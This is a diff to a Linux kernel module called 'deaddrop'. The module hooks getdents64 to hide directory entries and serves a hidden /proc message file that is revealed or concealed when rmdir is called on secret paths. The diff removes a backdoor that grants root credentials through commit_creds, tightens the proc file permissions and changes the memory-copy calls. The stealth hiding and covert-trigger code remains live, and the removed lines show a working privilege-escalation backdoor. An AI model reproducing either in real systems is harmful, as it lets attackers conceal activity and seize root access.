@@ -1,6 +1,5 @@
 // SPDX-License-Identifier: GPL-2.0
 #include <linux/types.h>
-#include <linux/cred.h>
 #include <linux/dirent.h>
 #include <linux/init.h>
 #include <linux/kprobes.h>
@@ -18,6 +17,20 @@
 static struct proc_dir_entry *drop_entry;
 static char drop_msg[256];
 static bool visible;
+
+static long copy_user_string_nofault(char *dst, const char __user *src,
+				     size_t size)
+{
+	size_t i;
+
+	for (i = 0; i < size; i++) {
+		if (copy_from_user_nofault(&dst[i], src + i, 1))
+			return -EFAULT;
+		if (dst[i] == '\0')
+			return i + 1;
+	}
+	return size;
+}
 
 /* --- proc read/write for the dead drop --- */
 
@@ -44,7 +57,7 @@ static ssize_t drop_write(struct file *f, const char __user *buf,
 	if (!visible)
 		return -EACCES;
 	len = count < sizeof(drop_msg) - 1 ? count : sizeof(drop_msg) - 1;
-	if (copy_from_user(drop_msg, buf, len))
+	if (copy_from_user_nofault(drop_msg, buf, len))
 		return -EFAULT;
 	if (len > 0 && drop_msg[len - 1] == '\n')
 		len--;
@@ -88,12 +101,12 @@ static int ret_getdents64(struct kretprobe_instance *ri,
 	if (ret <= 0)
 		return 0;
 
-	buf = kvmalloc(ret, GFP_KERNEL);
+	buf = kmalloc(ret, GFP_ATOMIC);
 	if (!buf)
 		return 0;
 
-	if (copy_from_user(buf, ctx->dirent, ret)) {
-		kvfree(buf);
+	if (copy_from_user_nofault(buf, ctx->dirent, ret)) {
+		kfree(buf);
 		return 0;
 	}
 
@@ -112,10 +125,10 @@ static int ret_getdents64(struct kretprobe_instance *ri,
 		off += cur->d_reclen;
 	}
 
-	if (copy_to_user(ctx->dirent, buf, ret))
+	if (copy_to_user_nofault(ctx->dirent, buf, ret))
 		ret = -EFAULT;
 	regs_set_return_value(regs, ret);
-	kvfree(buf);
+	kfree(buf);
 	return 0;
 }
 
@@ -136,24 +149,14 @@ static int pre_rmdir(struct kprobe *p, struct pt_regs *regs)
 	char kpath[128];
 	long len;
 
-	len = strncpy_from_user(kpath, upath, sizeof(kpath));
-	if (len <= 0)
+	len = copy_user_string_nofault(kpath, upath, sizeof(kpath));
+	if (len <= 0 || len >= (long)sizeof(kpath))
 		return 0;
 
 	if (strcmp(kpath, REVEAL_PATH) == 0) {
 		visible = true;
 	} else if (strcmp(kpath, HIDE_PATH) == 0) {
-		struct cred *cred;
-
 		visible = false;
-		cred = prepare_creds();
-		if (cred) {
-			cred->uid  = GLOBAL_ROOT_UID;
-			cred->gid  = GLOBAL_ROOT_GID;
-			cred->euid = GLOBAL_ROOT_UID;
-			cred->egid = GLOBAL_ROOT_GID;
-			commit_creds(cred);
-		}
 	}
 
 	return 0;
@@ -170,7 +173,7 @@ static int __init deaddrop_init(void)
 {
 	int err;
 
-	drop_entry = proc_create(HIDDEN_NAME, 0666, NULL, &drop_proc_ops);
+	drop_entry = proc_create(HIDDEN_NAME, 0600, NULL, &drop_proc_ops);
 	if (!drop_entry)
 		return -ENOMEM;
 
